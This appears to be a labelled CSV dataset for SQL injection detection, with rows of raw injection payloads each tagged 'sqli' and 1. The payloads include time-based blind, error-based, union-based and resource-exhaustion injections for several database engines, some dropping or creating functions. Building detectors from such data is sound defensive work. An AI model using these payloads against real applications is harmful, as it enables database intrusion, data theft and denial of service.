payload,attack_type,label
"1%'))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((('%'='",sqli,1
-1940 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),sqli,1
"1%"")) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((""%""=""",sqli,1
"1"" where 5039=5039 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"-4705' where 2029=2029 union all select 2029,2029,2029#",sqli,1
1%')) order by 1#,sqli,1
1';(select * from (select(sleep(5)))srmq) and 'fdgq'='fdgq,sqli,1
"-3460%""))) or 9323=9323#",sqli,1
"1"") as pydh where 3407=3407 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1
"-3498"")) as xbvb where 2056=2056 union all select 2056,2056,2056,2056,2056,2056,2056--",sqli,1
1%' and 1736=4220,sqli,1
1'))) and 6969=(select 6969 from pg_sleep(5)) and ((('qrtf'='qrtf,sqli,1
"1"")) as nejd where 2885=2885;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1,(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (7823=7823) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))",sqli,1
"1"")) or 8421=(select count(*) from generate_series(1,5000000)) and ((""ubxw"" like ""ubxw",sqli,1
"1')) or elt(5873=5873,sleep(5))#",sqli,1
"1"") where 7753=7753;select pg_sleep(5)--",sqli,1
"1 where 8949=8949 and make_set(8403=8403,8899)--",sqli,1
"1%'))) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1
"1') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)",sqli,1
1%') and 4595=4595#,sqli,1
1 where 8180=8180 or sleep(5)#,sqli,1
"-2626%') or elt(7513=8586,8586) and ('%'='",sqli,1
"1'||(select 'xsoq' from dual where 6690=6690 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))||'",sqli,1
"1"") and (5452=6050)*6050 and (""ciyc"" like ""ciyc",sqli,1
1') where 4298=4298;(select * from (select(sleep(5)))acdk)#,sqli,1
1'||(select 'tisi' from dual where 1616=1616 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))||',sqli,1
"-7564') as nank where 8095=8095 union all select 8095,8095,8095--",sqli,1
1'||(select 'uedk' where 4655=4655;waitfor delay '0:0:5')||',sqli,1
1') rlike (select (case when (7689=7689) then 1 else 0x28 end)),sqli,1
"1) where 7600=7600 union all select null,null,null,null,null,null--",sqli,1
"1"") where 7914=7914 rlike (select * from (select(sleep(5)))vwyq)#",sqli,1
"1"") as vdim where 1296=1296;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1
"1%"") and 8626=3626#",sqli,1
1')) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('guxv'='guxv,sqli,1
"1 union all select null,null,null,null,null,null,null,null,null,null--",sqli,1
"1'||(select 'ativ' from dual where 4746=4746 union all select null,null,null,null#",sqli,1
1)) and 3228=7376#,sqli,1
"1""))) or (select * from (select(sleep(5)))ydpu) and (((""epfg"" like ""epfg",sqli,1
1') where 6440=6440 or (select * from (select(sleep(5)))sddo)#,sqli,1
"1"") and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1
1') and 7533=7533 and ('cryr'='cryr,sqli,1
"1"") where 4739=4739 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1
"1)) as gygm where 4024=4024;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1' where 2332=2332 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1
"1%""))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((""%""=""",sqli,1
1) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),sqli,1
"-8118"") where 3561=3561 or (8459=8459)*4906--",sqli,1
"1 where 7240=7240 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1' where 7353=7353 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1
"1));iif(1305=5656,1,1/0)",sqli,1
"1') or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('amjh'='amjh",sqli,1
"1""))) rlike (select * from (select(sleep(5)))sgvo) and (((""sdps""=""sdps",sqli,1
"1) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",sqli,1
"1');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ('cxjp'='cxjp",sqli,1
"1%"" and elt(4249=4249,7259) and ""%""=""",sqli,1
1) as xtgr where 1545=1545;select pg_sleep(5)--,sqli,1
"-8429'))) or make_set(9354=9354,7185) and ((('bwih' like 'bwih",sqli,1
"-4589"") union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",sqli,1
1));select sleep(5) and ((3404=3404,sqli,1
1') or 6793=(select 6793 from pg_sleep(5)) and ('fupe'='fupe,sqli,1
"1"" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""hcjz"" like ""hcjz",sqli,1
"1')) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('niro'='niro",sqli,1
"-4176'+(select 'muio' where 4256=4256 union all select 4256,4256,4256,4256,4256,4256#",sqli,1
"-8364') union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#",sqli,1
"1'+(select 'fqkk' where 9725=9725;call regexp_substring(repeat(right(char(3702),0),500000000),null))+'",sqli,1
"-4983%"") or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""%""=""",sqli,1
"1%""))) union all select null,null,null,null,null,null,null,null,null,null#",sqli,1
"1') and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('zspf'='zspf",sqli,1
1')) and 2401=4693 and (('ssrm'='ssrm,sqli,1
"-1807')) union all select 9853,9853,9853,9853,9853,9853#",sqli,1
"1"" union all select null,null--",sqli,1
"1"")) or (select * from (select(sleep(5)))ydpu) and ((""imlq"" like ""imlq",sqli,1
"1'))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((('aduc'='aduc",sqli,1
"1)) as epfz where 5471=5471;select benchmark(5000000,md5(0x4c4d6142))--",sqli,1
"1%""))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""%""=""",sqli,1
1)) as gxvp where 3865=3865;select (case when (8716=1338) then 1 else 8716*(select 8716 from master..sysdatabases) end)--,sqli,1
"1"")));begin dbms_lock.sleep(5); end and (((""poee""=""poee",sqli,1
1))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((2197=2197,sqli,1
"-8971'||(select 'smyx' where 7970=7970 union all select 7970,7970,7970,7970,7970,7970,7970#",sqli,1
"1"" and 8407=(select count(*) from generate_series(1,5000000)) and ""eslo"" like ""eslo",sqli,1
"1))) union all select null,null#",sqli,1
-8966%' or (7475=4014)*4014 and '%'=',sqli,1
"1""));(select * from (select(sleep(5)))srmq) and ((""hxdd""=""hxdd",sqli,1
"1);call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1
1)) as eveb where 7567=7567;if(5316=4416) select 5316 else drop function vtve--,sqli,1
1 where 9872=9872;select (case when (3863=1151) then 3863 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1
-9024) where 1686=1686 or 3069=8213--,sqli,1
"-8414%"") union all select 2795#",sqli,1
"1' where 1602=1602 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1
"1' and make_set(8403=8403,8899) and 'fttd' like 'fttd",sqli,1
"-1823 where 6852=6852 union all select 6852,6852,6852,6852,6852,6852#",sqli,1
-3978 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)-- mtun,sqli,1
"-1681%"" union all select 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#",sqli,1
"-7815' union all select 2638,2638,2638,2638,2638--",sqli,1
"-6550') where 1675=1675 union all select 1675,1675,1675,1675,1675,1675,1675--",sqli,1
"1'+(select 'vjoj' where 5348=5348;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1"" rlike (select * from (select(sleep(5)))sgvo) and ""cxsu"" like ""cxsu",sqli,1
1);select sleep(5)#,sqli,1
"1%')) union all select null,null,null,null--",sqli,1
1')) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('hbwk' like 'hbwk,sqli,1
"1"")) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((""nobt""=""nobt",sqli,1
"1)));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((6051=6051",sqli,1
"1' in boolean mode)(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))#",sqli,1
-5356') or 9323=9323#,sqli,1
"-6595"" order by 1--",sqli,1
"-5528') union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",sqli,1
"1)) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((8048=8048",sqli,1
1' in boolean mode) rlike (select (case when (7689=7689) then 1 else 0x28 end))#,sqli,1
"1' or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))",sqli,1
"1;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1
"-5595"")) as xttj where 4562=4562 union all select 4562,4562,4562,4562,4562#",sqli,1
"1)) as nlzg where 1482=1482 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",sqli,1
1;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1
1%';begin user_lock.sleep(5); end--,sqli,1
"1%"") or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (""%""=""",sqli,1
"1) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (9509=9509",sqli,1
"-8327 where 7555=7555 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1
"-9352""))) or 3038=3038",sqli,1
"-8833')) union all select 3227,3227,3227,3227,3227--",sqli,1
"1"" or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)",sqli,1
1') as ihsc where 3978=3978;begin user_lock.sleep(5); end--,sqli,1
"-9734')) as izbx where 6273=6273 union all select 6273,6273,6273,6273,6273,6273,6273,6273,6273--",sqli,1
"1%') and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1
1%'))) and (9404=8390)*8390 and ((('%'=',sqli,1
"1'))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (('qeet'='qeet",sqli,1
1') where 8142=8142 waitfor delay '0:0:5'--,sqli,1
"1 where 7051=7051 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1
"-8580') union all select 3428,3428,3428,3428,3428,3428,3428,3428,3428#",sqli,1
"1"" and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""fqeu"" like ""fqeu",sqli,1
1%';begin dbms_lock.sleep(5); end--,sqli,1
"1)) as ndrh where 6308=6308;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1
"1%"")) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1
"1%""))) waitfor delay '0:0:5' and (((""%""=""",sqli,1
"-1408)) union all select 5715,5715,5715,5715,5715,5715--",sqli,1
"1')) as zari where 6847=6847;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1
"1') as zxho where 5907=5907 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1"") as advz where 5166=5166 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1
1) as jvmv where 3857=3857 and (5717=6483)*6483--,sqli,1
1')) as stnn where 6160=6160 and 8881=7347--,sqli,1
"1'||(select 'eyiy' from dual where 8127=8127;select benchmark(5000000,md5(0x714e4153))#",sqli,1
1' or (select * from (select(sleep(5)))sddo)#,sqli,1
"1"" where 4991=4991 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1
1%');if(8284=6171) select 8284 else drop function mbih--,sqli,1
"1')) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('uadr' like 'uadr",sqli,1
1)) as smtf where 5829=5829;select (case when (2350=8682) then 2350 else 1/(select 0) end)--,sqli,1
"1"")) as eqeb where 6784=6784 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",sqli,1
"1"")));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""ksip"" like ""ksip",sqli,1
"1"");select sleep(5)#",sqli,1
"1' in boolean mode) and 3824=benchmark(5000000,md5(0x76555642))#",sqli,1
"1"")) as isqj where 6344=6344 union all select null,null,null,null--",sqli,1
1'||(select 'abjv' from dual where 4200=4200;begin dbms_lock.sleep(5); end)||',sqli,1
"1;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual-- vykx",sqli,1
"1%') union all select null,null,null,null,null,null,null,null,null,null--",sqli,1
"1'+(select 'usoq' where 7783=7783 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161))+'",sqli,1
"-7868' in boolean mode) union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117#",sqli,1
"1')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1
"1');call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1
"1"") and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1
-1796') or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('lpuw' like 'lpuw,sqli,1
"1')) as xntz where 5801=5801 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",sqli,1
"1);create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1
"1) where 6472=6472;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",sqli,1
"1');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ('njnr'='njnr",sqli,1
1;select sleep(5)# wihl,sqli,1
1) where 7050=7050;waitfor delay '0:0:5'--,sqli,1
-5113'))) or 7200=3094--,sqli,1
"1'||(select 'scba' where 9079=9079 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1
"1%'))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('%'='",sqli,1
"1"")) union all select null,null,null,null,null,null,null,null--",sqli,1
"1'+(select 'hrxp' where 5948=5948;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)+'",sqli,1
1'||(select 'nwve' where 7721=7721;begin user_lock.sleep(5); end--,sqli,1
1'+(select nash where 4159=4159 union all select null#,sqli,1
"-8686"" where 4532=4532 or elt(3301=9065,9065)--",sqli,1
"1%'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('%'='",sqli,1
(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4501=4501) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),sqli,1
"1"") or sleep(5)#",sqli,1
"1"") and 3824=benchmark(5000000,md5(0x76555642)) and (""jozh""=""jozh",sqli,1
"1"") and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""dppw"" like ""dppw",sqli,1
-4610')) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('hdco'='hdco,sqli,1
"1%"";(select * from (select(sleep(5)))srmq) and ""%""=""",sqli,1
"1%"" union all select null,null--",sqli,1
1);select (case when (6435=8988) then 6435 else 6435*(select 6435 from information_schema.character_sets) end)#,sqli,1
